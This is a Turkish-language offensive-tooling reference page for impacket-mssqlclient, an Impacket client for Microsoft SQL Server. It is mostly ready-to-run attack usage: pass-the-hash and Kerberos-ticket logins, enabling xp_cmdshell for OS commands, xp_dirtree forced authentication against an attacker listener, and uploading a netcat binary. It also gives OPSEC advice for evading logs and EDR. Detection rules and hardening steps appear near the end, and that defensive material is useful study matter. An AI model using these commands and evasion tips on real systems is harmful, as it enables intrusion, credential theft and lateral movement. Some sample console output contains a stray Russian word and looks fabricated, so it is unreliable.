# impacket-mssqlclient

> **Kategori:** [10. KURUMSAL ALTYAPI, PAYLAŞIM VE VERİ AVI (ENTERPRISE DATA HUNTING)](./README.md) · **Modül:** [Modül 11 — Araç Cephaneliği](../README.md)
> **Tanım:** Linux ortamından TDS (Tabular Data Stream) protokolü üzerinden Microsoft SQL Server örneklerine bağlanan, Windows/Kerberos/NTLM ve Pass-the-Hash kimlik doğrulamasını destekleyen, etkileşimli SQL kabuğu ve dahili xp_cmdshell/OLE otomasyon komutları sunan Impacket aracı.

---

## 1. Genel Bakış ve Amaç

`impacket-mssqlclient` (veya `mssqlclient.py`), Fortra/SecureAuth Impacket kütüphanesinin bir parçası olarak geliştirilmiş, Linux ve Unix benzeri işletim sistemlerinden Microsoft SQL Server (MSSQL) sistemlerine doğrudan Tabular Data Stream (TDS 7.x/8.x) protokolü üzerinden bağlanmayı sağlayan komut satırı aracıdır.

Saldırı ve sızma testi operasyonlarında operatörler sıklıkla Linux tabanlı saldırı makineleri (Kali Linux, Debian C2 sunucuları) kullanır. `impacket-mssqlclient`, yerel bir Windows GUI istemcisine (SQL Server Management Studio - SSMS) veya Microsoft ODBC sürücülerine ihtiyaç duymadan saf Python ile TDS paketleri üretir. Bu sayede etki alanı kimlik bilgileri, Kerberos biletleri (`.ccache`) veya doğrudan NTLM hash'leri (`Pass-the-Hash`) ile SQL sunucularına kimlik doğrulaması yapabilir.

Aracın sunduğu etkileşimli kabuk (`SQL>`), yalnızca standart T-SQL sorgularını çalıştırmakla kalmaz; operatörün tek bir komutla `xp_cmdshell` açmasını, kapatmasını, komut yürütmesini veya dosya yükleyip indirmesini sağlayan yerleşik sömürü makroları (`enable_xp_cmdshell`, `xp_cmdshell`, `upload`) barındırır.

```
+-------------------------------------------------------------------------+
|                  impacket-mssqlclient Mimari Akışı                      |
+-------------------------------------------------------------------------+
                               |
               Linux Operatörü (Kali / C2 Host)
         [impacket-mssqlclient -windows-auth -k ...]
                               v
                     +--------------------+
                     | mssqlclient.py     |
                     | (TDS Protokolü)    |
                     +--------------------+
                               |
               TDS over TCP (Port 1433 / Dynamic)
               [Kerberos TGS / NTLM Hash / SQL Auth]
                               v
                +------------------------------+
                | Microsoft SQL Server         |
                | (sqlservr.exe)               |
                +------------------------------+
                               |
        +----------------------+----------------------+
        |                      |                      |
 1. SQL Query Engine    2. Surface Area Abuse   3. Linked Server
 (SELECT, INSERT,      (xp_cmdshell,           (AT [LINKED_SRV]
  DUMP Passwords)       sp_OACreate, xp_dirtree) EXEC '...')
        |                      |                      |
        v                      v                      v
 [Veritabanı Verisi]    [cmd.exe / SYSTEM]     [İç Ağ SQL Atlama]
```

### 1.1 TDS (Tabular Data Stream) Protokolü ve Kimlik Doğrulama
`impacket-mssqlclient`, SQL Server ile iletişim kurarken Microsoft'un tescilli uygulama katmanı protokolü olan TDS'yi kullanır:
* **SQL Server Authentication:** `sa` veya veritabanı yerel kullanıcıları için standart kullanıcı adı/parola doğrulaması.
* **Windows Authentication (Integrated Security - NTLM):** İstemci, TDS `SSPI` (Security Support Provider Interface) paketi üzerinden NTLM Type-1, Type-2 ve Type-3 el sıkışması gerçekleştirir. Pass-the-Hash (`-hashes :NTLM`) bu mekanizma ile çalışır.
* **Kerberos Authentication (`-k`):** Linux ortamında `KRB5CCNAME` ortam değişkeniyle sağlanan Kerberos biletini (TGS) TDS oturum açma paketine ekler.

### Neden Önemli?

| Senaryo / İhtiyaç | Operasyonel Açıklama |
|---|---|
| **Linux'tan Doğrudan MSSQL Erişimi** | Windows makinesine veya GUI araçlarına ihtiyaç duymadan terminal üzerinden tam donanımlı SQL yönetimi ve sömürü. |
| **Pass-the-Hash (PtH) ile SQL Girişi** | Servis hesabının parolası bilinmese dahi ele geçirilen NTLM hash'i ile doğrudan `sysadmin` oturumu açma. |
| **Kerberos Bilet Desteği (`.ccache`)** | Rubeus veya ticketer.py ile üretilen altın/gümüş biletleri Linux üzerinden MSSQL'e karşı kullanma. |
| **Dahili xp_cmdshell Makroları** | T-SQL konfigürasyon komutlarıyla (`sp_configure`) uğraşmadan tek satırda kabuk çalıştırma. |
| **Dosya Yükleme ve İndirme** | `xp_cmdshell` ve certutil/PowerShell olmadan doğrudan T-SQL bloklarıyla uzak sunucuya dosya aktarımı. |

### Alternatif Araçlarla Karşılaştırma

| Özellik / Boyut | impacket-mssqlclient | PowerUpSQL | sqsh / sqlcmd | Metasploit mssql_exec |
|---|---|---|---|---|
| **Çalıştığı Platform** | Linux / macOS / Windows (Python) | Windows (PowerShell) | Linux / Windows | Çoklu Platform |
| **Pass-the-Hash Desteği** | Evet (Yerel NTLM Hash) | Hayır (Bilet veya Parola) | Hayır | Evet |
| **Kerberos Bilet Desteği** | Evet (`-k` / ccache) | Evet (Windows LSA) | Sınırlı | Sınırlı |
| **Dahili Makro Komutları** | Evet (`enable_xp_cmdshell` vb.) | Cmdlet tabanlı | Hayır (Sadece ham SQL) | Modül parametresi |
| **Linked Server Crawl** | Manuel T-SQL | Otomatik Özyinelemeli | Manuel | Manuel |

---

## 2. Temel Sözdizimi ve Parametreler (CLI Flags)

`impacket-mssqlclient`, standart Impacket bağlantı sözdizimini kullanır.

### Genel Sözdizimi
```bash
impacket-mssqlclient [[etki_alanı/]kullanıcı[:parola]@]<hedef_ip> [Seçenekler]
```

### Kritik Parametreler Tablosu

| Parametre | Açıklama | Örnek Değer |
|---|---|---|
| `-port` | Hedef MSSQL servisinin dinlediği TCP portu (Varsayılan 1433). | `-port 51421` |
| `-db` | Bağlantı kurulacak başlangıç veritabanı adı (Varsayılan `master`). | `-db AdventureWorks` |
| `-windows-auth` | SQL Native Auth yerine Windows Tümleşik Kimlik Doğrulamasını zorlar. | *Argümansız bayrak* |
| `-hashes` | Pass-the-Hash için kullanılacak `LMHASH:NTHASH` çifti. | `-hashes :31d6cfe0d16ae931b73c59d7e0c089c0` |
| `-k` | Kerberos kimlik doğrulaması kullanır. Bilet `KRB5CCNAME` dosyasından okunur. | *Argümansız bayrak* |
| `-no-pass` | Parola sormaz (Kerberos biletleri veya boş parolalı hesaplar için). | *Argümansız bayrak* |
| `-dc-ip` | Kerberos kimlik doğrulaması için yetkili Etki Alanı Denetleyicisi IP'si. | `-dc-ip 10.0.0.1` |
| `-target-ip` | FQDN yerine farklı bir hedef IP'ye bağlanmak için kullanılır. | `-target-ip 192.168.1.50` |
| `-file` | Etkileşimli kabuk açmak yerine belirtilen SQL dosyasını çalıştırıp çıkar. | `-file queries.sql` |

### Dahili Kabuk Makro Komutları (`SQL>`)
`impacket-mssqlclient` bağlantısı sağlandıktan sonra aşağıdaki yerleşik makrolar kullanılabilir:
* `help`: Kullanılabilir makro komutlarını listeler.
* `enable_xp_cmdshell`: `show advanced options` ve `xp_cmdshell` yapılandırmasını otomatik etkinleştirir.
* `disable_xp_cmdshell`: `xp_cmdshell` yapılandırmasını kapatır (OPSEC temizliği).
* `xp_cmdshell <komut>`: İşletim sistemi düzeyinde komut koşturur.
* `sp_start_job <iş_adı>`: SQL Server Agent üzerinde tanımlı işi başlatır.
* `enable_ole` / `disable_ole`: OLE Otomasyon yordamlarını (`sp_OACreate`) açar/kapatır.
* `upload <yerel_yol> <uzak_yol>`: Uzak sunucuya ikili veya metin dosyası aktarır.

---

## 3. Pratik Komut Örnekleri

### Senaryo 1: Windows Kimlik Doğrulaması ile Etkileşimli SQL Kabuğuna Bağlanma
Etki alanı kullanıcısının kimlik bilgileriyle TCP 1433 portu üzerinden bağlanma ve etkileşimli kabuk açma.

```bash
impacket-mssqlclient corp.local/jdoe:Password123!@10.0.0.15 -windows-auth
```

**Örnek Konsol Çıktısı:**
```text
Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 

[*] Encryption required, switching to TLS
[*] ENVCHANGE(DATABASE): Old Value: master, New Value: master
[*] ENVCHANGE(LANGUAGE): Old Value: , New Value: us_english
[*] ENVCHANGE(PACKETSIZE): Old Value: 4096, New Value: 4096
[*] INFO(SQL01\PROD): Line 1: Changed database context to 'master'.
[*] INFO(SQL01\PROD): Line 1: Changed language setting to us_english.
[*] ACK: Result: 1 - Using прошедшей authentication
[+] Connection established with 10.0.0.15
SQL> SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER('sysadmin');
-------------------------------------------------------------------------------------------------------------------------------- 
SQL01\PROD                                                       CORP\jdoe                                                                                     1 
SQL> 
```

### Senaryo 2: Pass-the-Hash ile sysadmin Yetkisinde Komut Yürütme
Ele geçirilen servis hesabı NTLM hash'i ile oturum açma, `xp_cmdshell` etkinleştirme ve komut koşturma.

```bash
impacket-mssqlclient -windows-auth -hashes :51a26b735c02dcda234b21651d30f7b1 corp.local/sql_svc@10.0.0.15
```
```text
SQL> enable_xp_cmdshell
[*] INFO(SQL01\PROD): Line 185: Configuration option 'show advanced options' changed from 0 to 1. Run the RECONFIGURE statement to install.
[*] INFO(SQL01\PROD): Line 185: Configuration option 'xp_cmdshell' changed from 0 to 1. Run the RECONFIGURE statement to install.
SQL> xp_cmdshell whoami /priv
output                                                                             
--------------------------------------------------------------------------------   
USER INFORMATION                                                                   
----------------                                                                   
User Name: nt service\mssql$prod                                                   
Privileges Information                                                             
----------------------                                                             
Privilege Name                Description                    State                 
============================= ============================== ====================  
SeChangeNotifyPrivilege       Bypass traverse checking       Enabled               
SeImpersonatePrivilege        Impersonate a client after aut Enabled               
SQL> 
```

### Senaryo 3: Kerberos Bileti (.ccache) ile Parolasız Giriş
Linux bilet önbelleğindeki Kerberos TGS bileti ile MSSQL sunucusuna bağlanma.

```bash
export KRB5CCNAME=/tmp/jdoe.ccache
impacket-mssqlclient -k -no-pass -windows-auth SQL01.corp.local
```

### Senaryo 4: Dinamik Port Kullanan Adlandırılmış SQL Örneğine Bağlanma
Varsayılan 1433 dışında dinamik bir portta çalışan SQL sunucusuna bağlanma.

```bash
impacket-mssqlclient corp.local/dba_admin:Pass2026@10.0.0.20 -port 58492 -windows-auth
```

### Senaryo 5: Linked Server Üzerinden İç Ağdaki Sunucuda Sorgu Yürütme
Bağlı sunucu (`DB-BACKEND02`) üzerinden uzak veritabanındaki kullanıcıları ve `sa` durumunu sorgulama.

```text
SQL> SELECT * FROM OPENQUERY("DB-BACKEND02", 'SELECT @@servername, SYSTEM_USER, IS_SRVROLEMEMBER(''sysadmin'')');
```

### Senaryo 6: NTLM Coercion ile Saldırgan Dinleyicisine Hash Düşürme
Etkileşimli kabuk üzerinden `xp_dirtree` çalıştırarak Responder / ntlmrelayx dinleyicisine SMB tetikleme.

```text
SQL> EXEC master..xp_dirtree '\\10.0.0.5\share', 1, 1;
```

---

## 4. Karşılaşılan Hatalar ve Çözümleri (Troubleshooting)

| Hata Mesajı / Belirti | Olası Neden | Kesin Çözüm Adımı |
|---|---|---|
| `[-] Connection refused` veya `Timeout` | Hedef makinede SQL servisi kapalı, 1433 portu güvenlik duvarınca engelleniyor veya dinamik port kullanılıyor. | SSRP keşfi yapın veya Nmap ile açık portu tespit edip `-port <PORT>` bayrağını kullanın. |
| `Login failed for user '...'. Reason: Attempting to use an NT account name with SQL Server Authentication.` | Windows etki alanı kullanıcısı ile bağlanırken `-windows-auth` bayrağı unutulmuş. | Komuta `-windows-auth` parametresini ekleyin. |
| `Kerberos SessionError: KDC_ERR_S_PRINCIPAL_UNKNOWN` | Kerberos SPN (`MSSQLSvc/FQDN:port`) Active Directory'de bulunamıyor veya hedef IP adresiyle çağrıldı. | Hedefi IP yerine FQDN olarak belirtin (`SQL01.corp.local`) ve `-dc-ip` sağlayın. |
| `ERROR: xp_cmdshell is disabled on this server.` | Genişletilmiş saklı yordam devre dışı bırakılmış. | Kabuk içinde `enable_xp_cmdshell` makrosunu çalıştırın veya manuel `sp_configure` işletin. |
| `SSPI handshake failed. The target principal name is incorrect.` | NTLM kimlik doğrulamasında makine adı/SPN uyuşmazlığı yaşanıyor. | Hedef sunucunun FQDN adını `/etc/hosts` dosyasına ekleyin ve FQDN ile bağlanın. |
| `The execute permission was denied on the procedure 'xp_cmdshell'.` | Oturum açan kullanıcının `sysadmin` sunucu rolü bulunmuyor. | `SELECT IS_SRVROLEMEMBER('sysadmin');` ile yetkinizi denetleyin; Linked Server veya TRUSTWORTHY zafiyeti arayın. |

---

## 5. OPSEC ve Karşı Tespit (IOC)

`impacket-mssqlclient` ağ düzeyinde standart TDS protokolü kullandığı için ağ trafiği yönüyle meşru bir SQL yönetim aracı gibi görünür. Ancak oturum açma yöntemleri ve çalıştırılan makrolar uç nokta ve SIEM sistemlerinde izler bırakır.

```
[impacket-mssqlclient]
          │
          ├──> TDS Oturumu Açma ──────────────> Windows Event ID 4624 (Logon Type 3)
          │                                     SQL Errorlog: "Login succeeded for user..."
          │
          ├──> Pass-the-Hash Kullanımı ────────> Event ID 4624 (NTLM, KeyLength: 0)
          │
          ├──> enable_xp_cmdshell Makrosu ────> Event ID 15457 (sp_configure changed)
          │
          └──> xp_cmdshell Yürütmesi ──────────> Sysmon Event ID 1 (sqlservr.exe -> cmd.exe)
```

### 5.1 Bırakılan İzler ve Olay Günlükleri
* **Windows Security Event ID 4624 (Logon Type 3):** Ağ oturumu açma kaydı. NTLMv2 kimlik doğrulaması kullanıldığında `Authentication Package: NTLM` olarak loglanır.
* **SQL Server Configuration Event ID 15457:** `enable_xp_cmdshell` makrosu çalıştırıldığında `Configuration option 'xp_cmdshell' changed from 0 to 1` şeklinde olay günlüğüne düşer.
* **Sysmon Event ID 1 (Process Creation):** `ParentImage: sqlservr.exe` tarafından `cmd.exe` veya `powershell.exe` başlatılması doğrudan alarm üretir.
* **SQL Server ERRORLOG:** Başarılı/başarısız oturum açma kayıtları istemci IP'si ile birlikte metin dosyasına yazılır.

### 5.2 MITRE ATT&CK Eşleştirmesi

| Taktik | Teknik ID | Teknik Adı | Operasyonel Kullanım |
|---|---|---|---|
| **Initial Access / Lateral Movement** | [T1078.002](https://attack.mitre.org/techniques/T1078/002/) | Domain Accounts | Etki alanı kimlik bilgileriyle SQL sunucularına yanal hareket. |
| **Execution** | [T1059.003](https://attack.mitre.org/techniques/T1059/003/) | Windows Command Shell | `xp_cmdshell` ile işletim sistemi kabuğu çalıştırma. |
| **Lateral Movement** | [T1550.002](https://attack.mitre.org/techniques/T1550/002/) | Pass the Hash | NTLM hash'i ile doğrudan TDS oturumu açma. |
| **Credential Access** | [T1187](https://attack.mitre.org/techniques/T1187/) | Forced Authentication | `xp_dirtree` ile NTLM hash coercion tetikleme. |

### 5.3 OPSEC Risk ve Önlem Tablosu

| Tespit Riski | Teknik Sebebi | Azaltma / Önlem Stratejisi |
|---|---|---|
| **xp_cmdshell Açık Bırakılması** | `enable_xp_cmdshell` sonrası ayarın açık unutulması denetimlerde fark edilir. | Komut çalıştırma tamamlandıktan hemen sonra `disable_xp_cmdshell` makrosunu koşturun. |
| **NTLM Trafiği Uyarısı** | Modern AD ortamlarında NTLM kullanımının izlenmesi. | Parola veya hash yerine Kerberos bileti (`-k`) kullanarak Kerberos kimlik doğrulamasına geçin. |
| **Parent Process EDR Tespiti** | `sqlservr.exe` -> `cmd.exe` türetilmesi EDR tarafından engellenir. | Komut satırı açmak yerine doğrudan SQL sorgularıyla veri çekin; gerekirse CLR derlemesi enjekte edin. |

### 5.4 Tespit Kuralları

#### Sigma Kuralı (xp_cmdshell Configuration Change and Spawn)
```yaml
title: MSSQL xp_cmdshell Enabled and Executed
id: e4d3c2b1-1234-5678-9abc-def012345678
status: production
description: SQL Server konfigürasyonunda xp_cmdshell etkinleştirildi ve sqlservr.exe üzerinden komut yürütüldü.
logsource:
  product: windows
  service: security
detection:
  selection_config:
    EventID: 15457
  selection_process:
    EventID: 4688
    ParentProcessName|endswith: '\sqlservr.exe'
    NewProcessName|endswith:
      - '\cmd.exe'
      - '\powershell.exe'
  condition: selection_config or selection_process
falsepositives:
  - Veritabanı bakım otomasyonları
level: critical
```

#### Microsoft Sentinel KQL Sorgusu
```kql
SecurityEvent
| where EventID == 4688
| where ParentProcessName endswith "sqlservr.exe"
| where NewProcessName endswith "cmd.exe" or NewProcessName endswith "powershell.exe"
| project TimeGenerated, Computer, SubjectUserName, CommandLine, ParentProcessName
| order by TimeGenerated desc
```

#### YARA Kuralı
```yara
rule Impacket_MSSQLClient_Artifact {
    meta:
        description = "impacket-mssqlclient Python script tespiti"
        author = "Antigravity Active Directory Project"
        date = "2026-10-14"
        reference = "https://github.com/fortra/impacket"
    strings:
        $s1 = "impacket.mssql" ascii
        $s2 = "enable_xp_cmdshell" ascii
        $s3 = "disable_xp_cmdshell" ascii
        $s4 = "SQL Server Connector" ascii
        $s5 = "TDS 7.x/8.x" ascii wide nocase
    condition:
        3 of ($s*)
}
```

### 5.5 Savunma Karşılığı ve Sertleştirme (Hardening)
* **Gelişmiş Seçeneklerin Kapatılması:** `xp_cmdshell` ve `Ole Automation Procedures` kalıcı olarak devre dışı bırakılmalı, registry seviyesinde saklı yordam DLL'leri kısıtlanmalıdır.
* **Yönetici Hesabı Denetimi:** `sa` hesabı devre dışı bırakılmalı veya adı değiştirilmeli; karmaşık ve rastgele oluşturulmuş bir parola verilmelidir.
* **Kerberos Zorunluluğu:** SQL Server bağlantılarında NTLM kimlik doğrulaması devre dışı bırakılmalı, SPN yapılandırmaları eksiksiz tamamlanarak yalnızca Kerberos zorunlu tutulmalıdır.
* **TDS Trafiği Şifrelemesi:** `Force Encryption` seçeneği etkinleştirilerek SQL istemcisi ile sunucu arasındaki tüm TDS trafiği TLS ile şifrelenmeli, araya girme saldırıları önlenmelidir.
* **Ağ Seviyesinde Port İzolasyonu (Host Firewall):** TCP 1433 portu etki alanı genelindeki rastgele iş istasyonlarına tamamen kapatılmalı; yalnızca yetkili uygulama sunucularından ve yönetim istasyonlarından gelen TDS trafiğine izin verilmelidir.
* **Extended Events ve Audit Loglama:** `ALTER SERVER AUDIT` ile `FAILED_DATABASE_AUTHENTICATION_GROUP`, `SCHEMA_OBJECT_CHANGE_GROUP` ve `SERVER_OPERATION_GROUP` olayları merkezi SIEM sistemine aktarılarak şüpheli saklı yordam çalıştırmaları denetlenmelidir.

---

## 6. En Çok Kullanılan Komutlar ve Açıklamaları (Hızlı Referans / Cheat Sheet)

```bash
# 1. Windows Tümleşik Kimlik Doğrulaması ile Bağlantı
impacket-mssqlclient corp.local/jdoe:Password123!@10.0.0.15 -windows-auth

# 2. Pass-the-Hash (NTLM Hash) ile Bağlantı
impacket-mssqlclient -windows-auth -hashes :51a26b735c02dcda234b21651d30f7b1 corp.local/sql_svc@10.0.0.15

# 3. Kerberos Bileti (.ccache) ile Parolasız Bağlantı
export KRB5CCNAME=/tmp/jdoe.ccache && impacket-mssqlclient -k -no-pass -windows-auth SQL01.corp.local

# 4. SQL Server Yerel Kimlik Doğrulaması (sa) ile Bağlantı
impacket-mssqlclient sa:DatabaseAdmin2026!@10.0.0.15

# 5. Standart Dışı Portta Çalışan SQL Örneğine Bağlanma
impacket-mssqlclient corp.local/jdoe:Password123!@10.0.0.15 -port 51421 -windows-auth

# 6. Belirli Bir Başlangıç Veritabanı Seçerek Bağlanma
impacket-mssqlclient corp.local/jdoe:Password123!@10.0.0.15 -db HR_Database -windows-auth

# 7. SQL Sorgu Dosyasını Otomatik Çalıştırıp Çıkma
impacket-mssqlclient corp.local/jdoe:Password123!@10.0.0.15 -windows-auth -file dump_queries.sql

# 8. Belirli Bir Etki Alanı Denetleyicisi IP'si Belirterek Kerberos Girişi
impacket-mssqlclient -k -no-pass -windows-auth -dc-ip 10.0.0.1 SQL01.corp.local

# 9. Kabuk İçinde xp_cmdshell Etkinleştirme ve Komut Koşturma
# SQL> enable_xp_cmdshell
# SQL> xp_cmdshell whoami /all

# 10. Kabuk İçinde Hedef Sunucuya Dosya Yükleme
# SQL> upload /opt/payloads/nc64.exe C:\Temp\nc.exe
```

### Komut Detay Analizleri

#### 1. Windows Tümleşik Kimlik Doğrulaması ile Bağlantı
* **Ne Yapar?:** Active Directory etki alanı kullanıcısının kullanıcı adı ve parolası ile NTLM üzerinden TDS oturumu açar.
* **Ne Zaman Kullanılır?:** Ele geçirilen standart etki alanı kullanıcı kimlik bilgileriyle SQL sunucusuna ilk erişim sağlanırken.
* **Parametreler:**
  * `corp.local/jdoe:Password123!`: Etki alanı kullanıcı kimlik bilgileri.
  * `-windows-auth`: Windows tümleşik kimlik doğrulamasını etkinleştirir.

#### 2. Pass-the-Hash (NTLM Hash) ile Bağlantı
* **Ne Yapar?:** Açık metin parola gerektirmeden, LSASS bellek dökümünden veya SAM dosyasından elde edilen NTLM hash'i ile oturum açar.
* **Ne Zaman Kullanılır?:** Parolası kırılamayan ancak NTLM hash'i bilinen SQL servis hesaplarıyla oturum açmak için.
* **Parametreler:**
  * `-hashes :<NTHASH>`: LM ve NT hash ikilisini belirtir (LM boş geçilebilir).

#### 3. Kerberos Bileti (.ccache) ile Parolasız Bağlantı
* **Ne Yapar?:** Linux işletim sistemindeki bilet önbelleğinden Kerberos TGS biletini alarak parola sormadan SQL oturumu başlatır.
* **Ne Zaman Kullanılır?:** OPSEC açısından NTLM kullanımından kaçınıldığı veya Kerberos bilet hırsızlığı (Pass-the-Ticket) yapıldığı senaryolarda.
* **Parametreler:**
  * `-k`: Kerberos kimlik doğrulamasını seçer.
  * `-no-pass`: Parola sorma promptunu atlar.

#### 4. SQL Server Yerel Kimlik Doğrulaması (sa) ile Bağlantı
* **Ne Yapar?:** Active Directory kullanmadan, doğrudan MSSQL yerel `sa` veya SQL kullanıcısıyla bağlanır.
* **Ne Zaman Kullanılır?:** Etki alanı dışı veya DMZ ortamındaki SQL sunucularına sızarken.
* **Parametreler:**
  * `-windows-auth` bayrağı verilmediğinde varsayılan SQL Auth kullanılır.

#### 5. Standart Dışı Portta Çalışan SQL Örneğine Bağlanma
* **Ne Yapar?:** 1433 portu dışında adlandırılmış örnek (named instance) portuna TDS paketleri gönderir.
* **Ne Zaman Kullanılır?:** Varsayılan portun kapalı olduğu veya birden fazla SQL örneği barındıran sunuculara erişirken.
* **Parametreler:**
  * `-port 51421`: Hedef dinleme portunu tanımlar.

#### 6. Belirli Bir Başlangıç Veritabanı Seçerek Bağlanma
* **Ne Yapar?:** Bağlantı anında `master` veritabanı yerine belirtilen uygulama veritabanının bağlamını seçer.
* **Ne Zaman Kullanılır?:** Kullanıcının `master` veritabanında oturum açma yetkisi kısıtlanmış ancak hedef veritabanında izni olduğunda.
* **Parametreler:**
  * `-db HR_Database`: Başlangıç veritabanı adı.

#### 7. SQL Sorgu Dosyasını Otomatik Çalıştırıp Çıkma
* **Ne Yapar?:** Etkileşimli kabuk açmaz; yerel `.sql` dosyasındaki tüm sorguları sırayla işletip sonuçları konsola basar ve çıkar.
* **Ne Zaman Kullanılır?:** Otomasyon scriptleri veya hızlı veri döküm (dump) işlemlerinde.
* **Parametreler:**
  * `-file dump_queries.sql`: Yürütülecek sorgu metin dosyası.

#### 8. Belirli Bir DC IP'si Belirterek Kerberos Girişi
* **Ne Yapar?:** DNS çözümlenemediğinde Kerberos KDC bilet doğrulamasını belirtilen Etki Alanı Denetleyicisi IP'sine yönlendirir.
* **Ne Zaman Kullanılır?:** Dış saldırı makinelerinden iç ağ AD DNS'ine doğrudan ulaşılamadığı pivot durumlarında.
* **Parametreler:**
  * `-dc-ip 10.0.0.1`: KDC sunucusunun IP adresi.

#### 9. Kabuk İçinde xp_cmdshell Etkinleştirme ve Komut Koşturma
* **Ne Yapar?:** SQL kabuğu içinde tek bir makroyla `show advanced options` ve `xp_cmdshell`'i açar, ardından `whoami` komutunu çalıştırır.
* **Ne Zaman Kullanılır?:** `sysadmin` yetkisi doğrulandıktan hemen sonra işletim sisteminde komut çalıştırmak için.
* **Parametreler:**
  * `enable_xp_cmdshell`: Yerleşik Impacket makrosu.
  * `xp_cmdshell <komut>`: Komut yürütme yordamı.

#### 10. Kabuk İçinde Hedef Sunucuya Dosya Yükleme
* **Ne Yapar?:** Yerel dosyanın içeriğini T-SQL bloklarına dönüştürerek uzak Windows dosya sistemine yazar.
* **Ne Zaman Kullanılır?:** SMB paylaşımları veya HTTP indirme araçları engellendiğinde hedef sunucuya araç veya script aktarmak için.
* **Parametreler:**
  * `upload <yerel_yol> <uzak_yol>`: Dahili dosya aktarım komutu.

---

## Kaynaklar
* [Impacket Resmi GitHub Deposu](https://github.com/fortra/impacket)
* [Microsoft Open Specifications: [MS-TDS] Tabular Data Stream Protocol](https://learn.microsoft.com/en-us/openspecs/windows_protocols/ms-tds/)
* [MITRE ATT&CK: Exploitation of Remote Services (T1210)](https://attack.mitre.org/techniques/T1210/)
* [HackTricks: MSSQL Pentesting Guide](https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server)
* [SpecterOps: SQL Server Lateral Movement and Coercion Techniques](https://posts.specterops.io/)

---

> **Önceki:** [← PowerUpSQL](./PowerUpSQL.md) · **Sonraki:** [SharpSCCM →](./SharpSCCM.md)
